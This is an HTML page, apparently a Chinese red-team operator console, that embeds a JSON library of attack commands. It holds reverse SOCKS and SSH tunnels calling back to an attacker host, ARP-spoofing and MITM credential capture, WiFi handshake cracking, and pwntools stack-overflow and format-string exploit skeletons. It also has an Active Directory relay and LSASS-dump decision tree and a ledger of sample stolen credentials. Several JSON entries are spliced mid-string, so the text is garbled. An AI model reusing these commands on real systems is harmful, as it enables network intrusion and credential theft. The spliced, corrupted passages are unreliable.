<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RedOps Console — 渗透/红队知识库</title>
<style>
:root{
  --bg:#0b0e14;--panel:#121722;--panel2:#0e1420;--line:#1e2735;--fg:#dbe4f0;--dim:#7a8aa0;
  --acc:#ff5f56;--acc2:#39d98a;--warn:#ffb86c;--link:#6cb6ff;--mono:'JetBrains Mono',Consolas,'Courier New',monospace;
}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--fg);font:14px/1.65 -apple-system,'Segoe UI','Noto Sans SC',sans-serif;padding-bottom:60px}
a{color:var(--link);text-decoration:none}
::selection{background:#ff5f5655}
header{position:sticky;top:0;z-index:50;background:#0b0e14ee;backdrop-filter:blur(8px);border-bottom:1px solid var(--line);padding:10px 22px;display:flex;gap:16px;align-items:center;flex-wrap:wrap}
header h1{font-size:17px;letter-spacing:.5px;white-space:nowrap}
header h1 b{color:var(--acc)}
#q{flex:1;min-width:220px;background:var(--panel2);border:1px solid var(--line);border-radius:8px;color:var(--fg);padding:8px 14px;font-size:14px;outline:none}
#q:focus{border-color:var(--acc)}
.chips{display:flex;gap:6px;flex-wrap:wrap}
.chip{font-size:12px;padding:3px 10px;border-radius:99px;border:1px solid var(--line);background:var(--panel2);color:var(--dim);cursor:pointer}
.chip.on{color:var(--fg);border-color:#33415a;background:#182135}
nav{display:flex;gap:4px;padding:10px 22px 0;border-bottom:1px solid var(--line);position:sticky;top:53px;z-index:49;background:var(--bg)}
nav button{background:none;border:none;color:var(--dim);font-size:14px;padding:9px 16px;cursor:pointer;border-bottom:2px solid transparent}
nav button.on{color:var(--fg);border-bottom-color:var(--acc)}
main{padding:20px 22px;max-width:1280px;margin:0 auto}
.meta{color:var(--dim);font-size:12px;margin:0 0 14px}
/* stage flow */
.stage{position:relative;background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--acc);border-radius:10px;margin:0 0 26px 6px;padding:14px 18px}
.stage::after{content:'▼';position:absolute;left:24px;bottom:-22px;color:#2c3a50;font-size:15px}
.stage:last-child::after{content:''}
.stage h3{font-size:15px;cursor:pointer;user-select:none}
.stage h3 .tools{color:var(--dim);font-weight:400;font-size:12px;margin-left:10px}
.stage .bd{display:none;margin-top:12px}
.stage.open .bd{display:block}
/* command rows */
.cmd{display:flex;gap:10px;align-items:flex-start;background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:7px 10px;margin:7px 0}
.cmd:hover{border-color:#33415a}
.cmd code{flex:1;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-all;color:#c9e3ff}
.cmd .cp{flex:none;background:#1a2334;border:1px solid var(--line);color:var(--dim);border-radius:6px;padding:3px 10px;font-size:12px;cursor:pointer}
.cmd .cp:hover{color:var(--fg);border-color:var(--acc)}
.cmd .cp.ok{color:var(--acc2);border-color:var(--acc2)}
.note{color:var(--dim);font-size:12px;margin-left:6px}
.srcdoc{display:inline-block;font-size:11px;color:var(--link);border:1px solid #24405f;border-radius:5px;padding:0 7px;margin-right:8px;background:#0f1b2d}
.nb{display:inline-block;font-size:10px;border-radius:4px;padding:0 6px;margin-left:6px;border:1px solid;vertical-align:1px;white-space:nowrap}
.nb-h{color:#ff9aa2;border-color:#5c2434;background:#2a1620}
.nb-m{color:var(--warn);border-color:#5a4a28;background:#26210f}
.nb-l{color:var(--acc2);border-color:#2e5a3c;background:#173126}
/* matrix */
table{border-collapse:collapse;width:100%;font-size:13px}
th,td{border:1px solid var(--line);padding:8px 12px;text-align:left;vertical-align:top}
th{background:#141b29;color:#aebdd4;position:sticky;top:98px}
tr:nth-child(even) td{background:#0e1420}
td code{font-family:var(--mono);font-size:12px;color:#9fd0ff;word-break:break-all}
.audit{display:inline-block;background:#2a1620;border:1px solid #5c2434;color:#ff9aa2;font-size:11px;border-radius:5px;padding:1px 8px;white-space:nowrap}
/* map */
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
.card h4{font-size:14px;color:var(--fg);margin-bottom:8px}
.card h4 .n{color:var(--dim);font-weight:400;font-size:12px}
.card .t{color:var(--dim);font-size:12px;line-height:1.9}
.toast{position:fixed;bottom:22px;right:22px;background:#173126;border:1px solid var(--acc2);color:var(--acc2);padding:9px 18px;border-radius:8px;opacity:0;transition:.25s;pointer-events:none;z-index:99}
.toast.show{opacity:1}
#cnt{color:var(--dim);font-size:12px}
.hl{background:#3a2a10;color:#ffd27a;border-radius:3px}
h2.vt{font-size:16px;margin:4px 0 12px;color:#fff}
.svc{display:flex;gap:8px;flex-wrap:wrap;margin:0 0 16px}
.svc span{font-size:12px;border:1px solid var(--line);border-radius:99px;padding:3px 12px;background:var(--panel2)}
.svc .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;background:var(--dim)}
.svc .up .dot{background:var(--acc2)}.svc .down .dot{background:var(--acc)}
</style>
</head>
<body>
<header>
  <h1>Red<b>Ops</b> Console</h1>
  <select id="proj" title="当前项目(切换即全局切换产物/历史/台账上下文)" style="background:var(--panel2);border:1px solid var(--line);color:var(--fg);padding:7px 10px;border-radius:8px;font-size:13px"></select>
  <button onclick="newProj()" style="background:#1a2b1f;border:1px solid #2e5a3c;color:#9fd0a8;border-radius:8px;padding:7px 12px;cursor:pointer;font-size:13px;white-space:nowrap">＋ 项目</button>
  <input id="q" placeholder="全局搜索命令 / 工具 / 场景…  (如: kerberoast、esc8、psexec、hashcat)">
  <label style="font-size:12px;color:var(--dim);cursor:pointer;white-space:nowrap"><input type="checkbox" id="useproxy" onchange="if(typeof upd==='function')upd()"> 经 proxychains4</label>
  <span id="cnt"></span>
</header>
<nav>
  <button data-v="run" class="on">🚀 执行台</button>
  <button data-v="chain">⚔️ 攻击链</button>
  <button data-v="matrix">🧭 场景矩阵</button>
  <button data-v="cmds">⌨️ 命令库</button>
  <button data-v="board">📁 项目</button>
   <button data-v="hist">📊 历史</button>
   <button data-v="map">🗺️ 文档地图</button>
  <button data-v="cfg">⚙️ 配置</button>
</nav>
<main>
  <div id="v-run"></div>
  <div id="v-chain" style="display:none"></div>
  <div id="v-matrix" style="display:none"></div>
  <div id="v-cmds" style="display:none"></div>
  <div id="v-map" style="display:none"></div>
  <div id="v-hist" style="display:none"></div>
  <div id="v-board" style="display:none"></div>
  <div id="v-cfg" style="display:none"></div>
</main>
<div class="toast" id="toast">已复制 ✓</div>
<script>
const DATA = {"docs": [{"file": "01-信息收集.md", "title": "信息收集", "sections": [{"h": "nmap — 端口扫描与服务识别的事实标准", "src": "apt 包 `nmap`(/usr/bin/nmap)", "cmds": [{"c": "nmap -sn 192.168.1.0/24", "n": "ping 扫描整个网段,只列出存活主机", "lang": "bash"}, {"c": "nmap -sn -PE -PP -PS80,443 <目标IP>", "n": "ICMP/ARP/TCP SYN 混合探测,绕过禁 ping 的主机", "lang": "bash"}, {"c": "nmap -Pn -sn <目标IP>", "n": "跳过主机发现,直接假定目标存活(防火墙丢 ping 时用)", "lang": "bash"}, {"c": "nmap -sn 10.0.0.1-100 --exclude 10.0.0.25", "n": "扫一段地址并排除特定主机", "lang": "bash"}, {"c": "nmap -p- --min-rate 5000 -T4 <目标IP> -oA allports", "n": "TCP 全端口(0-65535),高速模式", "lang": "bash"}, {"c": "nmap -sU --top-ports 100 --min-rate 1000 <目标IP>", "n": "UDP 只扫最常见 100 端口(UDP 慢,别轻易全扫)", "lang": "bash"}, {"c": "nmap -sS -p 1-1000 -v <目标IP>", "n": "半开扫描前 1000 端口,较隐蔽(需 root)", "lang": "bash"}, {"c": "nmap -sV -sC -O -p 80,443,22,3389 <目标IP>", "n": "对开放端口做版本探测+默认脚本+操作系统识别", "lang": "bash"}, {"c": "nmap -sV --version-intensity 5 -p 80 <目标IP>", "n": "加大版本探测强度(默认 2,最大 9,越慢越准)", "lang": "bash"}, {"c": "nmap --script vuln -p 80,443 <目标IP>", "n": "跑漏洞类 NSE 脚本快速体检", "lang": "bash"}, {"c": "nmap --script smb-vuln-ms17-010 -p 445 <目标IP>", "n": "单点检测永恒之蓝(触发 IDS 高危告警,授权测试再用)", "lang": "bash"}, {"c": "nmap -sV -p- <目标IP> -oA results/目标名", "n": "同时生成 .nmap(可读)/.gnmap(可grep)/.xml(可入库)", "lang": "bash"}, {"c": "grep Ports results/目标名.gnmap | awk -F/ '/open/{print $1, $7}'", "n": "从 gnmap 提取开放端口列表", "lang": "bash"}, {"c": "nmap -sV -iL targets.txt -oA results/batch", "n": "从文件批量扫目标", "lang": "bash"}]}, {"h": "masscan — 极高速全网段端口扫描(先粗筛后交给 nmap 精扫)", "src": "apt 包 `masscan`(/usr/bin/masscan)", "cmds": [{"c": "masscan <目标IP> -p 1-65535 --rate=10000 --open-only -oL masscan.txt", "n": "全端口高速扫,只留开放端口", "lang": "bash"}, {"c": "masscan 10.0.0.0/24 --rate=10000 --open-only -oL masscan.txt", "n": "扫整个 C 段", "lang": "bash"}, {"c": "masscan -iL targets.txt -p 80,443,8080 --rate=5000 --banners", "n": "批量目标+常用 Web 端口+抓 banner", "lang": "bash"}, {"c": "masscan <目标IP> -p- --rate=10000 --open-only -oL masscan.txt", "n": "第一步:masscan 秒级找出开放端口(输出格式:协议 端口 IP 时间戳)", "lang": "bash"}, {"c": "PORTS=$(awk '{print $3}' masscan.txt | sort -un | paste -sd,)", "n": "从结果提取开放端口号", "lang": "bash"}, {"c": "nmap -sV -sC -p \"$PORTS\" <目标IP> -oA results/精扫", "n": "只对开放端口精扫,省时间", "lang": "bash"}]}, {"h": "amass — 深度子域名枚举与攻击面测绘(OWASP 项目)", "src": "apt 包 `amass`(Kali 包装脚本 /usr/bin/amass,实际二进制 /usr/lib/amass/amass,当前 v5.1.1)", "cmds": [{"c": "export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334", "n": "联网数据源走代理", "lang": "bash"}, {"c": "amass enum -passive -d <域名> -o amass_passive.txt", "n": "纯被动枚举(只查公开数据源,不碰目标)", "lang": "bash"}, {"c": "amass enum -d <域名> -active -brute -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o amass_active.txt", "n": "", "lang": "bash"}, {"c": "amass enum -d <域名> -r 8.8.8.8,1.1.1.1", "n": "指定公共 DNS 解析器(防本机 DNS 污染)", "lang": "bash"}, {"c": "amass db -list", "n": "查看本地已保存的枚举数据库", "lang": "bash"}]}, {"h": "sublist3r — 轻量快速子域名枚举(聚合多个搜索引擎)", "src": "apt 包 `sublist3r`(/usr/bin/sublist3r)", "cmds": [{"c": "export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334", "n": "依赖 Google/Bing 等外部源,走代理", "lang": "bash"}, {"c": "sublist3r -d <域名> -o subs.txt", "n": "默认聚合枚举,结果存文件", "lang": "bash"}, {"c": "sublist3r -d <域名> -b -t 40", "n": "加子域爆破,40 线程", "lang": "bash"}, {"c": "sublist3r -d <域名> -p 80,443,8080 -v", "n": "对发现的子域探测常见 Web 端口(-v 显示实时进度)", "lang": "bash"}, {"c": "sublist3r -d <域名> -e google,bing,virustotal", "n": "只用指定数据源引擎", "lang": "bash"}]}, {"h": "theHarvester — 从公开渠道收集邮箱、子域、主机与人员信息(OSINT)", "src": "apt 包 `theharvester`(当前 v4.11.1,/usr/bin/theHarvester)", "cmds": [{"c": "export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334", "n": "所有数据源都在线,走代理", "lang": "bash"}, {"c": "theHarvester -d <域名> -b google,bing,crtsh,duckduckgo -l 500", "n": "收集邮箱+主机名,限制 500 条", "lang": "bash"}, {"c": "theHarvester -d <域名> -b crtsh,dnsdumpster -f report", "n": "结果同时存 HTML/JSON 报告" 枚举", "src": "apt 包 `enum4linux`(Perl 老版,/usr/bin/enum4linux)、`enum4linux-ng`(Python 重写版,/usr/bin/enum4linux-ng)", "cmds": [{"c": "enum4linux -a <目标IP>", "n": "老版全量:用户/组/共享/密码策略/RID 枚举一把梭", "lang": "bash"}, {"c": "enum4linux -a -u '<用户名>' -p '<密码>' <目标IP>", "n": "老版带凭据,枚举结果完整得多", "lang": "bash"}, {"c": "enum4linux-ng -A <目标IP> -oA enum_out", "n": "新版全量,三格式输出(enum_out.txt/json/yaml)", "lang": "bash"}, {"c": "enum4linux-ng -A -u '<用户名>' -p '<密码>' -R <目标IP> -oJ out.json", "n": "新版带凭据 + RID 暴力枚举,JSON 入库", "lang": "bash"}]}, {"h": "fscan — 内网一键存活/端口/弱口令/漏扫(本机二进制)", "src": "本机二进制 `~/tools/bin/fscan`(Go 单文件,免依赖,可直接丢到跳板机运行)", "cmds": [{"c": "sudo ~/tools/bin/fscan -h <目标CIDR>", "n": "一键:C 段存活+端口+服务弱口令+常见 POC", "lang": "bash"}, {"c": "sudo ~/tools/bin/fscan -h <目标IP> -p 22,80,445,3389,3306,6379 -nopoc", "n": "指定端口,只爆破不做漏扫", "lang": "bash"}, {"c": "sudo ~/tools/bin/fscan -h <目标IP> -userdf users.txt -pwdf passwords.txt", "n": "用自己的用户/密码字典爆破", "lang": "bash"}, {"c": "sudo ~/tools/bin/fscan -hf hosts.txt -m smb -t 200", "n": "从文件读目标,只跑 smb 模块,限 200 线程", "lang": "bash"}]}, {"h": "与新体系的衔接", "src": "", "cmds": []}]}, {"file": "06-隧道与代理.md", "title": "隧道与代理", "sections": [{"h": "chisel — HTTP 通道上的端口转发与反向 SOCKS5 隧道", "src": "apt 包 `chisel`(/usr/bin/chisel,v1.12)", "cmds": [{"c": "chisel server -p 8000 --reverse --socks5", "n": "攻击机:启动服务端,-p 指定端口;--reverse 必开才允许客户端注册 R: 反向隧道,--socks5 开放服务端内置 socks5", "lang": "bash"}, {"c": "./chisel client <攻击机IP>:8000 R:socks", "n": "目标机:把 chisel 二进制传上去后回连,建立反向 SOCKS5(服务端 127.0.0.1:1080 出现 socks5 入口)", "lang": "bash"}, {"c": "./chisel client <攻击机IP>:8000 R:socks R:3389:10.0.0.5:3389", "n": "目标机:反向端口转发与 socks 叠加,一次建立多条隧道(攻击机 3389 -> 目标内网 10.0.0.5:3389)", "lang": "bash"}, {"c": "chisel server -p 8000 --reverse --auth user:pass", "n": "服务端", "lang": "bash"}, {"c": "./chisel client <攻击机IP>:8000 --auth user:pass R:socks", "n": "客户端", "lang": "bash"}]}, {"h": "ligolo-ng — 基于 TUN 接口的内网穿透(免 proxychains,像 VPN 一样用)", "src": "本机二进制 `~/tools/bin/ligolo_proxy`、`~/tools/bin/ligolo_agent`(v0.9.1)", "cmds": [{"c": "sudo ip tuntap add user kali mode tun ligolo", "n": "手工创建名为 ligolo 的 tun 设备(仅一次;也可在控制台用 interface_create 创建)", "lang": "bash"}, {"c": "sudo ip link set ligolo up", "n": "启用该 tun 设备", "lang": "bash"}, {"c": "sudo ~/tools/bin/ligolo_proxy -selfcert", "n": "启动代理端,首次自动生成自签证书并打印 agent 连接命令", "lang": "bash"}, {"c": "~/tools/bin/ligolo_agent -connect <攻击机IP>:11601 -ignore-cert", "n": "忽略证书校验(仅测试环境)", "lang": "bash"}, {"c": "~/tools/bin/ligolo_agent -connect <攻击机IP>:11601 -accept-fingerprint <SHA256指纹>", "n": "更安全:代理端控制台执行 certificate_fingerprint 查看指纹后:", "lang": "bash"}, {"c": "sudo ip route add <内网网段>/24 dev ligolo", "n": "把 agent 所在内网网段路由指向 tun,如 10.10.10.0/24", "lang": "bash"}, {"c": "nmap -sT -Pn -n <内网网段>/24", "n": "直接扫描内网(ligolo 是用户态栈,建议 -sT 全连接;SYN 半开扫描会误报)", "lang": "bash"}]}, {"h": "proxychains4 — 强制任意命令走 SOCKS4/5 或 HTTP 代理链", "src": "apt 包 `proxychains4`(/usr/bin/proxychains4,配置文件 /etc/proxychains4.conf)", "cmds": [{"c": "sudo sed -i 's/^socks4.*/socks5  127.0.0.1 1080/' /etc/proxychains4.conf", "n": "编辑 [ProxyList] 段", "lang": "bash"}, {"c": "grep -A2 ProxyList /etc/proxychains4.conf", "n": "确认修改生效", "lang": "bash"}, {"c": "proxychains4 nmap -sT -Pn -n <内网IP>", "n": "nmap 必须全连接扫描 -sT 才能过 socks(不支持 SYN 半开)", "lang": "bash"}, {"c": "proxychains4 curl http://<内网IP>/", "n": "通过 socks5 访问内网 Web", "lang": "bash"}, {"c": "proxychains4 ssh <用户名>@<内网IP>", "n": "内网 SSH 也可直接套", "lang": "bash"}, {"c": "proxychains4 -q -f ./chain.conf curl http://<内网IP>/", "n": "-q 静默输出;-f 指定自定义配置(如多级链:socks5 A -> socks5 B)", "lang": "bash"}]}, {"h": "ssh 隧道 — 用 SSH 自带能力做本地/动态/远程转发", "src": "系统自带 openssh-client(/usr/bin/ssh)", "cmds": [{"c": "ssh -N -L 0.0.0.0:7001:10.0.0.5:3389 <用户名>@<跳板IP>", "n": "本地转发 -L:攻击机本地 7001 -> 经跳板机 -> 内网 10.0.0.5:3389(访问本机 7001 即内网 RDP)", "lang": "bash"}, {"c": "ssh -N -D 0.0.0.0:1080 <用户名>@<SSH服务器IP>", "n": "动态转发 -D:本地 1080 起 SOCKS5,流量从 SSH 服务器一侧出网(配合 proxychains4 使用)", "lang": "bash"}, {"c": "ssh -N -R 0.0.0.0:7002:127.0.0.1:3389 <用户名>@<攻击机IP>", "n": "攻击机 7002 -> 目标机自身 3389", "lang": "bash"}, {"c": "ssh -N -R 0.0.0.0:1080 <用户名>@<攻击机IP>", "n": "攻击机 1080 变 SOCKS5,出口是目标机(需 OpenSSH>=7.6)", "lang": "bash"}]}, {"h": "mitmproxy — HTTP(S) 中间人代理:抓包、改包、重放", "src": "apt 包 `mitmproxy`(/usr/bin/mitmproxy、mitmdump、mitmweb,v12.2)", "cmds": [{"c": "mitmproxy --listen-host 0.0.0.0 --listen-port 8080", "n": "常规代理模式:监听 0.0.0.0:8080,客户端(浏览器/手机)把代理指向本机即可", "lang": "bash"}, {"c": "mitmweb --listen-host 0.0.0.0 --no-web-open-browser", "n": "Web 界面:浏览器打开 http://127.0.0.1:8081 看流量表格;远程访问用 --set web_host=0.0.0.0", "lang": "bash"}, {"c": "sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080", "n": "80 重定向到 mitmproxy", "lang": "bash"}, {"c": "sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080", "n": "443 同理", "lang": "bash"}, {"c": "mitmproxy --mode transparent --listen-port 8080", "n": "启动透明代理", "lang": "bash"}, {"c": "mitmdump -w traffic.flows -p 8080", "n": "落盘保存(flows 格式)", "lang": "bash"}, {"c": "mitmdump -r traffic.flows --set flow_detail=2", "n": "回放查看;也可 grep 明文凭据", "lang": "bash"}]}, {"h": "bettercap — ARP 欺骗嗅探与 HTTP 凭据捕获(近源场景见 08 文件)", "src": "apt 包 `bettercap`(/usr/bin/bettercap,v2.41;caplets 在 /usr/share/bettercap/caplets)", "cmds": [{"c": "sudo bettercap -iface eth0", "n": "进入交互式控制台(-iface 指定内网口),随后在 > 提示符逐条输入模块命令", "lang": "bash"}, {"c": "sudo bettercap -iface eth0 -caplet http-req-dump", "n": "一键抓 HTTP 请求/凭据:官方 caplet 自动开启代理嗅探并 dump 全部请求(含表单)", "lang": "bash"}]}, {"h": "与新体系的衔接", "src": "", "cmds": []}]}, {"file": "07-权限提升.md", "title": "权限提升", "sections": [{"h": "linpeas.sh — Linux 本地提权自动化枚举(PEASS)", "src": "本机脚本 /home/kali/tools/src/PEASS-ng/linPEAS/linpeas.sh(git 仓库在 ~/tools/src/PEASS-ng)", "cmds": [{"c": "cd /home/kali/tools/src/PEASS-ng/linPEAS", "n": "注意在 linPEAS 目录内执行", "lang": "bash"}, {"c": "export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334", "n": "builder 要联网下外部工具", "lang": "ba n": "0 = 持续广播 deauth(较猛,慎用)", "lang": "bash"}, {"c": "sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz", "n": "首次使用先解压字典(-k 保留原 gz 文件)", "lang": "bash"}, {"c": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP的MAC> capture-01.cap", "n": "破解;KEY FOUND 即出密码", "lang": "bash"}]}, {"h": "wifite — 自动化 WiFi 攻击(自动扫场、抓握手、调字典破解)", "src": "apt 包 `wifite`(/usr/sbin/wifite,wifite2 v2.8.2)", "cmds": [{"c": "sudo wifite", "n": "默认抓 WPA 握手,抓到后自动用内置字典尝试", "lang": "bash"}, {"c": "sudo wifite --kill", "n": "同上,并先杀掉冲突进程(等价 airmon-ng check kill)", "lang": "bash"}, {"c": "sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt", "n": "常用组合:指定破解字典(rockyou 需先按上文解压)", "lang": "bash"}]}, {"h": "bettercap(近源)— WiFi 侦察、信道锁定与反认证", "src": "apt 包 `bettercap`(/usr/bin/bettercap,v2.41)", "cmds": [{"c": "sudo bettercap -iface wlan0mon", "n": "用监听模式网卡启动(先用 06/aircrack 小节切好 monitor;或直接指定 wlan0)", "lang": "bash"}]}, {"h": "hcxtools(hcxpcapngtool)— 握手包转哈希,交给 hashcat 高速破解", "src": "apt 包 `hcxtools`(/usr/bin/hcxpcapngtool,v7.1.2)", "cmds": [{"c": "hcxpcapngtool -o hash.22000 capture-01.cap", "n": "airodump 的 cap 文件", "lang": "bash"}, {"c": "hcxpcapngtool -o hash.22000 bettercap-wifi-handshakes.pcap", "n": "bettercap 抓的握手包同样可转", "lang": "bash"}, {"c": "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt", "n": "字典需先 gunzip(见 aircrack 小节)", "lang": "bash"}, {"c": "hashcat -m 22000 hash.22000 --show", "n": "查看已破解结果", "lang": "bash"}]}, {"h": "与新体系的衔接", "src": "", "cmds": []}]}, {"file": "09-逆向与利用开发.md", "title": "逆向与利用开发", "sections": [{"h": "ghidra — NSA 开源反编译逆向平台(伪 C 恢复、跨架构)", "src": "apt 包 `ghidra`(启动器 /usr/bin/ghidra,主程序 /usr/share/ghidra/ghidraRun,v12.1.3)", "cmds": [{"c": "ghidra", "n": "启动图形界面(等价 /usr/share/ghidra/ghidraRun);首次运行选择 Project 工作目录", "lang": "bash"}, {"c": "mkdir -p /tmp/gproj && /usr/share/ghidra/support/analyzeHeadless /tmp/gproj pwn -import ./<程序名>", "n": "导入并自动分析到项目", "lang": "bash"}, {"c": "/usr/share/ghidra/support/analyzeHeadless /tmp/gproj pwn -process <程序名> -noanalysis", "n": "复用已分析项目做批处理(可加 -postScript 脚本)", "lang": "bash"}]}, {"h": "pwntools — Python 漏洞利用框架(连接、构造 payload、调试一体化)", "src": "Kali 预装 python3-pwntools(v4.15.0;`python3 -c \"from pwn import *\"` 即可用)", "cmds": [{"c": "cat > exp.py <<'EOF'", "n": "通用模板:交互式连接脚本(存为 exp.py)", "lang": "bash"}, {"c": "from pwn import *", "n": "", "lang": "bash"}, {"c": "context.arch = 'amd64'", "n": "目标架构: i386/amd64/arm/arm64,影响 p64/shellcraft", "lang": "bash"}, {"c": "context.log_level = 'debug'", "n": "打印原始收发字节,排查交互问题", "lang": "bash"}, {"c": "p = remote('<目标IP>', <端口>)", "n": "远程靶机", "lang": "bash"}, {"c": "p.sendline(b'hello')", "n": "发送一行", "lang": "bash"}, {"c": "p.recvuntil(b'name: ')", "n": "接收直到指定提示", "lang": "bash"}, {"c": "print(p.recvline())", "n": "读一行回显", "lang": "bash"}, {"c": "p.interactive()", "n": "进入交互模式拿 shell(Ctrl-C 退出)", "lang": "bash"}, {"c": "EOF", "n": "", "lang": "bash"}, {"c": "python3 exp.py", "n": "运行脚本", "lang": "bash"}, {"c": "python3 -c \"from pwn import *; print(cyclic(200).decode())\"", "n": "生成 200 字节 De Bruijn 序列,整段发给程序使其崩溃", "lang": "bash"}, {"c": "python3 -c \"from pwn import *; print(cyclic_find(0x61616168))\"", "n": "崩溃时 EIP/RIP=0x61616168(按实际改),输出即为偏移", "lang": "bash"}, {"c": "python3 -c \"from pwn import *; context.arch='amd64'; print(asm(shellcraft.amd64.linux.sh()).hex())\"", "n": "生成 execve('/bin/sh') shellcode 十六进制", "lang": "bash"}, {"c": "cat > exp_stack.py <<'EOF'", "n": "栈溢出骨架(64 位 ret2system/ROP)", "lang": "bash"}, {"c": "from pwn import *", "n": "", "lang": "bash"}, {"c": "context.arch = 'amd64'", "n": "32 位改 i386,p64 换 p32", "lang": "bash"}, {"c": "elf = ELF('./<程序名>')", "n": "解析本地二进制取符号", "lang": "bash"}, {"c": "offset = <偏移>", "n": "上一步 cyclic_find 得到的值", "lang": "bash"}, {"c": "pop_rdi = <pop_rdi地址>", "n": "ropper/ROPgadget 搜索得到(见下)", "lang": "bash"}, {"c": "binsh = next(elf.search(b'/bin/sh'))", "n": "二进制里搜 /bin/sh 字符串地址", "lang": "bash"}, {"c": "system = elf.sym['system']", "n": "有符号直接取;PIE/无符号时先 leak 再算", "lang": "bash"}, {"c": "p = remote('<目标IP>', <端口>)", "n": "换 process('./<程序名>') 打本地", "lang": "bash"}, {"c": "payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(system)", "n": "mov rdi,binsh;ret 到 system;栈没对齐时前面垫一个 p64(ret地址)", "lang": "bash"}, {"c": "p.sendlineafter(b'input:', payload)", "n": "按题面提示符调整", "lang": "bash"}, {"c": "p.interactive()", "n": "getshell", "lang": "bash"}, {"c": "EOF", "n": "", "lang": "bash"}, {"c": "python3 exp_stack.py", "n": "", "lang": "bash"}, {"c": "cat > exp_fmt.py <<'EOF'", "n": "格式化字符串骨架(任意地址写)", "lang": "bash"}, {"c": "from pwn import *", "n": "", "lang": "bash"}, {"c": "elf = ELF('./<程序名>')", "n": "", "lang": "bash"}, {"c": "p = remote('<目标IP>', <端口>)", "n": "", "lang": "bash"}, {"c": "payload = fmtstr_payload(7, {elf.got['printf']: elf.sym['main']})", "n": "把 printf@got 改写回 main,制造循环利用", "lang": "bash"}, {"c": "p.sendline(payload)", "n": "", "lang": "bash"}, {"c": "p.interactive()", "n": "", "lang": "bash"}, {"c": "EOF", "n": "", "lang": "bash"}, {"c": "python3 exp_fmt.py", "n": "", "lang": "bash"}]}, {"h": "ropper — gadget 搜索与自动 ROP 链生成", "src": "apt 包 `ropper`(/usr/bin/ropper,v1.13.8)", "cmds": [{"c": "ropper --file ./<程序名>", "n": "列出二进制全部 gadgets", "lang": "bash"}, {"c": "ropper --file ./<程序名> --search \"pop rdi\"", "n": "按正则搜索指定 gadget(64 位第一参数寄存器)", "lang": "bash"}, {"c": "ropper --file ./<程序名> --search \"jmp rsp\"", "n": "搜 jmp/call rsp,配合栈执行 shellcode", "lang": "bash"}, {"c": "ropper --file ./<程序名> --chain execve --nocolor", "n": "自动生成 execve ROP 链(无色输出便于复制)", "lang": "bash"}]}, {"h": "ROPgadget — 轻量 gadget 搜索(ropchain 自动生成)", "src": "apt 包 `ROPgadget`(入口 /usr/bin/ROPgadget,Python 实现)", "cmds": [{"c": "ROPgadget --binary ./<程序名>", "n": "列出全部 gadgets(带地址)", "lang": "bash"}, {"c": "ROPgadget --binary ./<程序名> --only \"pop|ret\"", "n": "只保留含 pop/ret 的 gadget", "lang": "bash"}, {"c": "ROPgadget --binary ./<程序名> --string \"/bin/sh\"", "n": "在可读段搜字符串地址(找 /bin/sh)", "lang": "bash"}, {"c": "ROPgadget --binary ./<程序名> --depth 20", "n": "gadget 2-33679,见 16 号 §1)", "n": "", "lang": "text"}, {"c": "├─ LDAPS 中继被拒             → 转 ntlmrelayx -t http://<CA>(ESC8)或 -socks 挂会话慢慢用", "n": "", "lang": "text"}, {"c": "└─ mitm6 无 IPv6 流量         → 回 responder(LLMNR)+ 喷洒", "n": "", "lang": "text"}, {"c": "ADCScertipy req 失败", "n": "", "lang": "text"}, {"c": "├─ CERTSRV_E_TEMPLATE_DENIED → 模板无 Enroll 权:certipy find -vulnerable 重看 ESC 编号;ESC9/ESC10 弱映射换证书模板", "n": "", "lang": "text"}, {"c": "├─ CA 不可达                  → relay 到 CA(ESC8);CA 离线就放弃 ADCS 转 Kerberos 链", "n": "", "lang": "text"}, {"c": "└─ certipy auth 失败          → 检查 KDC 时间/krb5.conf;-kirbi 出票转 mimikatz ptt 试", "n": "", "lang": "text"}, {"c": "横向被拦(EDR/审计)", "n": "", "lang": "text"}, {"c": "├─ psexec 服务创建被拦        → wmiexec(免服务落盘)→ atexec(计划任务)→ evil-winrm(WinRM 日志)", "n": "", "lang": "text"}, {"c": "├─ LSASS 读取失败(RunAsPPL)  → 13 文档「LSASS PPL 绕过」(comsvcs MiniDump)", "n": "", "lang": "text"}, {"c": "└─ 全程被 EDR 压制           → 转入 C2(见下节)用 implant 的内存执行/睡眠混淆", "n": "", "lang": "text"}]}, {"h": "凭据台账(每拿一个凭据立刻登记)", "src": "", "cmds": [{"c": "时间,类型,主体,域,值(密码/NT哈希/票据路径),来源(哪台机器/哪个工具),已知权限,用过没,备注", "n": "", "lang": "csv"}, {"c": "2026-09-15 12:00,密码,jsmith,TEST.LOCAL,Passw0rd!,10.10.10.5 nxc,域用户+Web服务器本地管理员,已用,GPP 发现", "n": "", "lang": "csv"}, {"c": "2026-09-15 12:30,NT哈希,TEST\\svc_sql,TEST.LOCAL,aad3b435b51404ee:31d6cfe0d16a,10.10.10.20 secretsdump,服务账户/SPN MSSQLSvc,未用,PTH 待验证", "n": "", "lang": "csv"}]}, {"h": "手工 → C2 衔接(什么时候该转 implant)", "src": "", "cmds": [{"c": "sliver-client", "n": "已装;import 操作员配置后:", "lang": "bash"}]}, {"h": 